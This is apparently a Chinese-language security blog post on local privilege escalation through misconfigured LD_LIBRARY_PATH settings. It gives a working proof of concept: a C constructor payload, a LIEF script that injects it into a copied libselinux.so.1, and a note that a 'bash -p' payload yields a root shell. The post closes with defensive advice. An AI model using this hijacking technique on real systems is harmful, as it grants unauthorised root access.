---
title: LD_LIBRATY_PATH环境变量不正确配置导致本地提权
authors: Enokiy
date: 2024-02-02
categories: [本地提权]
tags: [本地提权]

---

## 概述

环境变量LD_LIBRARY_PATH用于在**程序加载运行期间**查找动态链接库时指定除了系统默认路径之外的其他路径。

linux中动态链接库的查询顺序:LD_PRELOAD、/etc/ld.so.preload、DT_RPATH、LD_LIBRARY_PATH、DT_RUNPATH、/etc/ld.so.cache、以及默认目录/lib、/usr/lib（64位系统下是/lib64，/usr/lib64）。

       (1)  Using the directories specified in the DT_RPATH dynamic
            section attribute of the binary if present and DT_RUNPATH
            attribute does not exist.  Use of DT_RPATH is deprecated.(设置了DT_RPATH并且DT_RUNPATH不为空时，查找DT_RPATH设置的目录)

       (2)  Using the environment variable LD_LIBRARY_PATH, unless the
            executable is being run in secure-execution mode (see
            below), in which case this variable is ignored.

       (3)  Using the directories specified in the DT_RUNPATH dynamic
            section attribute of the binary if present.  Such
            directories are searched only to find those objects required
            by DT_NEEDED (direct dependencies) entries and do not apply
            to those objects' children, which must themselves have their
            own DT_RUNPATH entries.  This is unlike DT_RPATH, which is
            applied to searches for all children in the dependency tree.

       (4)  From the cache file /etc/ld.so.cache, which contains a
            compiled list of candidate shared objects previously found
            in the augmented library path.  If, however, the binary was
            linked with the -z nodefaultlib linker option, shared
            objects in the default paths are skipped.  Shared objects
            installed in hardware capability directories (see below) are
            preferred to other shared objects.

       (5)  In the default path /lib, and then /usr/lib.  (On some
            64-bit architectures, the default paths for 64-bit shared
            objects are /lib64, and then /usr/lib64.)  If the binary was
            linked with the -z nodefaultlib linker option, this step is
            skipped.


网上搜索一下LD_LIBRARY_PATH环境变量的配置，常见的配置方法是 `export LD_LIBRARY_PATH=/xxx/yyy:/lib64 `，这种配置下需要检查/xxx普通用户是否可控，如果可控，则存在本地提权风险；

其他的几种配置方法：
* `export LD_LIBRARY_PATH=/lib64:$LD_LIBRARY_PATH ` 
* `export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/lib64`  
* `export LD_LIBRARY_PATH=LD_LIBRARY_PATH:lib64  `

**这几种配置方式都有so劫持风险，从而导致本地提权:** 

*  `export LD_LIBRARY_PATH=/lib64:$LD_LIBRARY_PATH `    # 默认$LD_LIBRARY_PATH为空，配置变成了`export LD_LIBRARY_PATH=/lib64:`，如果在/lib64中找不到so，则在当前工作目录搜索，存在风险；
* `export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/lib64`     # 默认$LD_LIBRARY_PATH为空，配置变成了`export LD_LIBRARY_PATH=:/lib64`，使用:分割，则表示优先在当前工作目录搜索，存在劫持风险；
* `export LD_LIBRARY_PATH=LD_LIBRARY_PATH:lib64  `      # 错误写法，相对路径LD_LIBRARY_PATH目录；

## 利用

**1.高权限用户配置 export LD_LIBRARY_PATH=/xxx:/lib64 `， /xxx/目录普通用户可写**

![](/assets/images/local_privilege/2024-02-23-14-55-31.png)

**利用过程:**

(1) strace进程找到依赖的共享库: 

> 对于sudo脚本怎么通过strace找到依赖库?
>
>开两个shell，第一个中通过`echo $$` 获取到当前pid:
>
>![](/assets/images/local_privilege/2024-02-28-15-54-00.png)
>
>在另一个shell中通过strace跟踪获取到的pid，将跟踪结果输出到文件，再通过grep 文件查找需要的信息:
>
> root@ubuntu22:/tmp/enokiy#strace -o output.log -f -p 1323
>
>![](/assets/images/local_privilege/2024-02-28-15-40-00.png)
>![](/assets/images/local_privilege/2024-02-28-15-52-21.png)
>
>对于二进制文件，直接通过ldd查看。


(2) 使用普通用户在可控目录下生成libselinux.so.1文件，生成过程：

```c
shell.c

#include<stdlib.h>
#include<stdio.h>
#include<string.h>

__attribute__((__constructor__)) void preload (void){
	system("bash -c 'touch /tmp/hacked'");
}
```

```Console
gcc -shared -fPIC -w shell.c -o shell.o
```

```python

import sys
import lief

str_so_orignal=sys.argv[1]
str_so_gadget=sys.argv[2]

libnative = lief.parse(str_so_orignal)
libnative = lief.add_library(str_so_gadget)
libnative.write(str_so_orignal)
```

```Console
enokiy@ubuntu22:/tmp/enokiy$ cp  /lib/x86_64-linux-gnu/libselinux.so.1 ./
enokiy@ubuntu22:/tmp/enokiy$ python3 shell.py libselinux.so.1 shell.o
```

(3) 执行sudo脚本触发so劫持

![](/assets/images/local_privilege/2024-02-28-16-25-59.png)

~~把shell.c中的`bash -c 'touch /tmp/hacked'` 改成`bash -p` 可直接获得root权限的shell。~~

**2.高权限用户的环境变量配置 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/lib64**

**利用方式**

因为$LD_LIBRARY_PATH默认为空，所以优先会在当前目录查找，利用方式跟前一个类似，把依赖库放到当前目录即可。

**3.高权限用户的环境变量配置 export LD_LIBRARY_PATH=/lib64:$LD_LIBRARY_PATH** 

**利用方式**

因为$LD_LIBRARY_PATH默认为空，所以该配置变成了如果在前面配置的目录中没找到依赖库，就会在当前目录进行查找，利用方式类似2。

**4.高权限用户的环境变量配置 export LD_LIBRARY_PATH=/lib64:LD_LIBRARY_PATH 或者export LD_LIBRARY_PATH=LD_LIBRARY_PATH:/lib64** 

**利用方式**

单纯的拼写错误，少了一个$，路径变成了相对路径LD_LIBRARY_PATH，低权限用户创建LD_LIBRARY_PATH目录，然后在LD_LIBRARY_PATH目录中放置恶意so即可利用。

## 总结

其他类似的环境变量还包括LD_PRELOAD、PATH等，对于高权限用户启动的进程，注意环境变量中不要存在低权限用户可控的目录或脚本/应用。

## 参考

* [man-pages/man8/ld.so.8.html](https://man7.org/linux/man-pages/man8/ld.so.8.html)
* [LIEF](https://github.com/lief-project/LIEF)